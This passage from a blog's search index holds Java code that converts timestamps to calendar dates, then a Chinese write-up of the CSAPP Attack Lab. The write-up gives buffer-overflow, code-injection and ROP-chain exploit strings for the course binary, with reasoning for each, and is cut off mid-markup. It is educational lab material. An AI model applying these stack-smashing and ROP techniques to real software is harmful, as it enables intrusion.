<span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerSecond = <span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerMinute = <span class=\"number\">1000</span>*<span class=\"number\">60</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerHour = <span class=\"number\">3600</span>*<span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerDay = <span class=\"number\">24</span>*<span class=\"number\">3600</span>*<span class=\"number\">1000</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerPingNian = <span class=\"number\">365</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePerLeapYear = <span class=\"number\">366</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeOf1970And1971 = timePerPingNian+timePerPingNian;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timePer4Year = (<span class=\"keyword\">long</span>)(<span class=\"number\">365.25</span>*<span class=\"number\">4</span>*timePerDay);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeEvery400Year = timePer4Year*<span class=\"number\">100</span> - <span class=\"number\">3</span>*timePerDay;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">long</span> timeOf1970To2000 = timePer4Year*<span class=\"number\">7</span>+timeOf1970And1971;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] daysPerMonth = &#123;<span class=\"number\">31</span>, <span class=\"number\">28</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setMinuteAndSecond</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> milliTime&lt;timePerDay;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&gt;=timePerDay)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        hour = (<span class=\"keyword\">int</span>)(milliTime/timePerHour);</span><br><span class=\"line\">        <span class=\"keyword\">long</span> t = milliTime%timePerHour;</span><br><span class=\"line\">        minute = (<span class=\"keyword\">int</span>)(t/timePerMinute);</span><br><span class=\"line\">        t = t%timePerMinute;</span><br><span class=\"line\">        second = (<span class=\"keyword\">int</span>)(t/timePerSecond);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setMonthAndDay</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime, <span class=\"keyword\">boolean</span> isLeapYear)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//this func should handle  the case where milliTime == 0;</span></span><br><span class=\"line\">        <span class=\"comment\">//this func get the milliseconds within 1 year;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">assert</span> milliTime&lt;=timePerLeapYear &amp;&amp; isLeapYear || milliTime&lt;=timePerPingNian &amp;&amp; !isLeapYear;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&gt;timePerLeapYear &amp;&amp; isLeapYear || milliTime&gt;timePerPingNian &amp;&amp; !isLeapYear) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        daysPerMonth[<span class=\"number\">1</span>] = isLeapYear ? <span class=\"number\">29</span> : <span class=\"number\">28</span>; <span class=\"comment\">//set the days of February;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">int</span> cnt = -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">do</span>&#123;</span><br><span class=\"line\">            milliTime -= daysPerMonth[++cnt]*timePerDay;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">while</span> (milliTime&gt;=<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        month = cnt+<span class=\"number\">1</span>;  <span class=\"comment\">//for that the cnt begin from 0, but month begin from 1;</span></span><br><span class=\"line\">        <span class=\"keyword\">long</span> timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime;</span><br><span class=\"line\">        day = (<span class=\"keyword\">int</span>)(timeOfLastMonth/timePerDay)+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        setMinuteAndSecond(timeOfLastMonth % timePerDay);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> <span class=\"title\">setDataFile</span><span class=\"params\">(<span class=\"keyword\">long</span> milliTime)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(milliTime&lt;<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> is1970Or1971 = milliTime&lt;timeOf1970And1971 ? <span class=\"keyword\">true</span> : <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> is20Century = milliTime&lt;timeOf1970To2000 ? <span class=\"keyword\">true</span>: <span class=\"keyword\">false</span>; </span><br><span class=\"line\">       \t<span class=\"comment\">//if equal is 2000 1 1 0:0:0</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(is1970Or1971) &#123;</span><br><span class=\"line\">            year = milliTime&gt;=timePerPingNian ? <span class=\"number\">1971</span> : <span class=\"number\">1970</span>;</span><br><span class=\"line\">            setMonthAndDay(year==<span class=\"number\">1971</span> ? milliTime-timePerPingNian : milliTime, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(is20Century) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">long</span> t = (milliTime-timeOf1970And1971)/timePer4Year;  </span><br><span class=\"line\">            <span class=\"keyword\">long</span> t1 = milliTime-timeOf1970And1971-t*timePer4Year;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">long</span> t2 = t1-timePerLeapYear;</span><br><span class=\"line\">            <span class=\"keyword\">boolean</span> isLeapYear = t2&lt;<span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">long</span> t3 = isLeapYear ? <span class=\"number\">0</span> : t2/timePerPingNian+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            year = (<span class=\"keyword\">int</span>)(<span class=\"number\">1972</span>+t*<span class=\"number\">4</span>+t3);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">long</span> l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay);</span><br><span class=\"line\">            setMonthAndDay(l, isLeapYear);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> p = milliTime-timeOf1970To2000;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t1 = p/timeEvery400Year;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> p1 = p-t1*timeEvery400Year;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t2 = p1/timePer4Year;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> tN = t2/<span class=\"number\">25</span>;    </span><br><span class=\"line\">      \t<span class=\"comment\">//in every 400 years, other year such as xy00(y!=0) is not leap year;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      \t<span class=\"keyword\">long</span> p2 = p1-t2*timePer4Year;</span><br><span class=\"line\">        p2 += tN*timePerDay;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> t3 = p2-timePerLeapYear;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> isLeapYear = t3&lt;<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> t4 = isLeapYear ? <span class=\"number\">0</span> : t3/timePerPingNian+<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        year = (<span class=\"keyword\">int</span>)(<span class=\"number\">2000</span>+t1*<span class=\"number\">400</span>+t2*<span class=\"number\">4</span>+t4);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">long</span> lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay);</span><br><span class=\"line\">        setMonthAndDay(lt, isLeapYear);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><h4 id=\"设置时分秒（函数setMinuteAndSecond）\"><a href=\"#设置时分秒（函数setMinuteAndSecond）\" class=\"headerlink\" title=\"设置时分秒（函数setMinuteAndSecond）\"></a>设置时分秒（函数setMinuteAndSecond）</h4><ul>\n<li>函数的输入是 小于 每天毫秒数  的一个整数</li>\n<li>因为是从0:0:0开始计时，所以很好算</li>\n<li>直接除以每小时毫秒数，结果就是 要求的小时数</li>\n<li>然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数</li>\n<li>以此类推，算出秒数</li>\n</ul>\n<h4 id=\"设置月和日（函数setMonthAndDay）\"><a href=\"#设置月和日（函数setMonthAndDay）\" class=\"headerlink\" title=\"设置月和日（函数setMonthAndDay）\"></a>设置月和日（函数setMonthAndDay）</h4><ul>\n<li>函数的输入为  小于  每年毫秒数  一个整数</li>\n<li>依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。<strong>注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59</strong></li>\n<li>通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始）</li>\n</ul>\n<h4 id=\"设置年份（在函数setDataFile中）\"><a href=\"#设置年份（在函数setDataFile中）\" class=\"headerlink\" title=\"设置年份（在函数setDataFile中）\"></a>设置年份（在函数setDataFile中）</h4><ul>\n<li><p>对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。<strong>注意，等于也是，原因如上所述。</strong>然后调用setMonthAndDay函数，设置日月</p>\n</li>\n<li><p>对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。</p>\n<p>然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$</p>\n</li>\n<li><p>然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$</p>\n<p>接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$</p>\n<p>接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$</p>\n<p>接下来调用setMonthAndDay函数设置月份日期</p>\n</li>\n</ul>\n","slug":"从时间戳（毫秒）计算日历","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/tags/算法/"},{"name":"时间戳","slug":"时间戳","permalink":"https://h-zex.github.io/tags/时间戳/"},{"name":"日历","slug":"日历","permalink":"https://h-zex.github.io/tags/日历/"}]},{"title":"CSAPP Attack Lab","date":"2017-09-16T05:18:56.000Z","path":"2017/09/16/CSAPP-Attack-Lab/","text":"CSAPP Attack Lab 本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符 第一题答案123456789aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa/* this five lines fill the buf */c0 17 40 00 00 00 00 00 /* touch1's addr */ 思路 不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上touch1的地址（直接用十六进制写），然后用hex2raw转换后输入即可AC 第二题答案123456789101112131415161718ec 17 40 00 00 00 00 00 /* touch2的地址 */48 83 ec 30/* sub $0x30, %rsp */48 c7 c7 fa 97 b9 59 /* mov $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/c3 /* retq */aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa aa aa aa aa /* 填充的字符串 */80 dc 61 55/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */ 思路 需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置 需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址 第三题答案1234567891011121314151617181920212223242526272829fa 18 40 00 00 00 00 00 /* touch3 addr, in 0x5561dc78 */48 83 ec 30 /* sub $0x30,%rsp, in 0x5561dc80 */48 c7 c7 90 dc 61 55 /* mov $0x5561dc90,%rdi */c3 /* retq will ret to 0x5561dc78 */ 00 00 00 00 /*fill the extra space */35 39 62 39 39 37 66 61 00 /* string \"59b997fa\" ，in 0x5561dc90 */aa aa aa aa aa aa aa /* fill the extra space */ 80 dc 61 55 00 00 00 00 /* 0x5561dc80, our code's begin addr *//* * just before our attack code is run, * rsp == 0x5561dca0 * return addr in 0x5561dca0*/ 思路 比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串 然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80 接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶 第四题答案123456789101112131415161718aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa/* this five line fill the buf */cc 19 40 00 00 00 00 00 /* 0x4019cc pop %rax; nop; ret */fa 97 b9 59 00 00 00 00 /* 0x59b997fa */a2 19 40 00 00 00 00 00 /* 0x4019a2 movq %rax, %rdi; ret */ec 17 40 00 00 00 00 00 /* touch2 0x4017ec */ 思路 构造rop链，在0x4019ca处有b8 29 58 90 c3 mov $0xc3905829,%eax，观察字节码，在0x4019cc处的58是pop rax，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax 在0x4019a0有8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax，观察字节码，0x4019a2处有48 89 c7，也就是mov %rax, %rdi，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了 第五题答案12345678910111213141516171819202122232425262728293031323334aa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aaaa aa aa aa aa aa aa aa /* this five lines fill space of buf */17 2b 40 00 00 00 00 00 /* 402b17, pop rsi,ret to this, assume that rsp is K */20 00 00 00 00 00 00 00 /* the data pop to rsi */00 00 00 00 00 00 00 00 /* the data are pop to r15 *//* after all pop, rsp is K+16 */06 1a 40 00 00 00 00 00 /* 401a06, movq rsp, rax, ret to here, rsp is K+24 */a2 19 40 00 00 00 00 00 /* 4019a2, movq rax, rdi */d6 19 40 00 00 00 00 00 /* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */c5 19 40 00 00 00 00 00 /* 4019c5, mov rax, rdi */fa 18 40 00 00 00 00 00 /* 4018fa touch3 */35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 /* 0x59b997fa in here */ 思路 把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后 用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的lea (%rdi,%rsi,1),%rax符合要求 为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到pop %r14，该指令第二个字节5e是pop %rsi，因为该指令跟ret之间还有pop %r15，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。 r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？） 之后用多个mov，实现rsp mov到rax再mov到rdi 然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi 接着就是touch3的地址，让mov rax rdi下面那条ret直接跳转到touch3，攻击成功 几个注意点 用vim的16进制编辑模式要加在打开vim时加-b，否则，会把诸如c0这一类大于0x3f的不属于ascii范围的字符修改成3f ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节 指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址 ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置 注意gets遇到编码为0xFF的字符时不会终止读取","raw":"---\ntitle: CSAPP Attack Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-16 13:18:56\ntags:\n- CSAPP Lab\ndescription: CSAPP 攻击实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP Attack Lab\n\n> 本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符\n\n### 第一题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\n/* this five lines fill the buf */\n\nc0 17 40 00\t00 00 00 00 \n/* touch1's addr */\n```\n\n#### 思路\n\n- 不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上`touch1`的地址（直接用十六进制写），然后用`hex2raw`转换后输入即可AC\n\n### 第二题\n\n#### 答案\n\n```c\nec 17 40 00 00 00 00 00 \n/* touch2的地址 */\n\n48 83 ec 30\n/* sub  $0x30, %rsp */\n\n48 c7 c7 fa 97 b9 59 \n/* mov  $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/\n\nc3 /* retq */\n\naa aa aa aa aa aa aa aa\naa aa aa aa  aa aa aa aa \naa aa aa aa \n/* 填充的字符串 */\n\n80 dc 61 55\n/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */\n```\n\n#### 思路\n\n- 需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置\n- 需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址\n\n### 第三题\n\n#### 答案\n\n```c\nfa 18 40 00 00 00 00 00 \n/* touch3 addr, in 0x5561dc78 */\n\n48 83 ec 30 \n/* sub $0x30,%rsp, in 0x5561dc80 */\n\n48 c7 c7 90 dc 61 55 \n/* mov  $0x5561dc90,%rdi */\n\nc3 \n/* retq will ret to 0x5561dc78 */   \n\n00 00 00 00 \n/*fill the extra space */\n\n35 39 62 39 39 37 66 61\t00\t\n/* string \"59b997fa\" ，in 0x5561dc90 */\n\naa aa aa aa aa aa aa \n/* fill the extra space */ \n\n80 dc 61 55 00 00 00 00 \n/* 0x5561dc80, our code's begin addr */\n\n/* \n* just before our attack code is run, \n* rsp == 0x5561dca0 \n* return addr in 0x5561dca0\n*/\n```\n\n#### 思路\n\n- 比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串\n- 然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80\n- 接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶\n\n### 第四题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa \naa aa aa aa aa aa aa aa\n/* this five line fill the buf */\n\ncc 19 40 00 00 00 00 00\t\n/* 0x4019cc\t pop %rax; nop; ret */\n\nfa 97 b9 59 00 00 00 00\t\n/* 0x59b997fa */\n\na2 19 40 00 00 00 00 00\t\n/* 0x4019a2\t movq %rax, %rdi; ret */\n\nec 17 40 00 00 00 00 00\t\n/* touch2 0x4017ec */\n```\n\n\n\n#### 思路\n\n- 构造rop链，在0x4019ca处有`  b8 29 58 90 c3 mov $0xc3905829,%eax`，观察字节码，在0x4019cc处的`58`是`pop rax`，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax\n- 在0x4019a0有`8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax`，观察字节码，0x4019a2处有`48 89 c7`，也就是`mov %rax, %rdi`，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了\n\n### 第五题\n\n#### 答案\n\n```c\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\naa aa aa aa aa aa aa aa\t\t\n/* this five lines fill space of buf */\n\n17 2b 40 00 00 00 00 00\t \t\n/* 402b17, pop rsi,ret to this, assume that rsp is K */\n\n20 00 00 00 00 00 00 00\t\n/* the data pop to rsi */\n\n00 00 00 00 00 00 00 00\t\n/* the data are pop to r15 */\n/* after all pop, rsp is K+16 */\n\n06 1a 40 00 00 00 00 00\t\t\n/* 401a06, movq rsp, rax, ret to here, rsp is K+24 */\n\na2 19 40 00 00 00 00 00\t\t\n/* 4019a2, movq rax, rdi */\n\nd6 19 40 00 00 00 00 00\t\t\n/* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */\n\nc5 19 40 00 00 00 00 00\t\t\n/* 4019c5, mov rax, rdi */\n\nfa 18 40 00 00 00 00 00\t\t\n/* 4018fa touch3 */\n\n35 39 62 39 39 37 66 61\t00 00 00 00 00 00 00 00\t\n/* 0x59b997fa in here */\n```\n\n#### 思路\n\n- 把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后\n\n- 用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的`lea (%rdi,%rsi,1),%rax`符合要求\n\n- 为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到`pop %r14`，该指令第二个字节`5e`是`pop %rsi`，因为该指令跟ret之间还有`pop %r15`，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。\n\n  > r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？）\n\n- 之后用多个mov，实现rsp mov到rax再mov到rdi\n\n- 然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi\n\n- 接着就是touch3的地址，让`mov rax rdi`下面那条ret直接跳转到touch3，攻击成功\n\n### 几个注意点\n\n- 用vim的16进制编辑模式要加在打开vim时加`-b`，否则，会把诸如`c0`这一类大于`0x3f`的不属于ascii范围的字符修改成`3f`\n\n\n- ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节\n- 指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址\n- ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置\n- 注意gets遇到编码为0xFF的字符时不会终止读取\n\n","content":"<h1 id=\"CSAPP-Attack-Lab\"><a href=\"#CSAPP-Attack-Lab\" class=\"headerlink\" title=\"CSAPP Attack Lab\"></a>CSAPP Attack Lab</h1><blockquote>\n<p>本文所有答案都是传给hex2raw的文本，hex2raw会在转换好的字符串后添加换行符，所以答案里没有换行符</p>\n</blockquote>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><h4 id=\"答案\"><a href=\"#答案\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\"><span class=\"comment\">/* this five lines fill the buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c0 <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span>\t<span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch1's addr */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>不需要传参，而且没有各种保护，直接构造一个0x28长度的字符串加上<code>touch1</code>的地址（直接用十六进制写），然后用<code>hex2raw</code>转换后输入即可AC</li>\n</ul>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><h4 id=\"答案-1\"><a href=\"#答案-1\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td 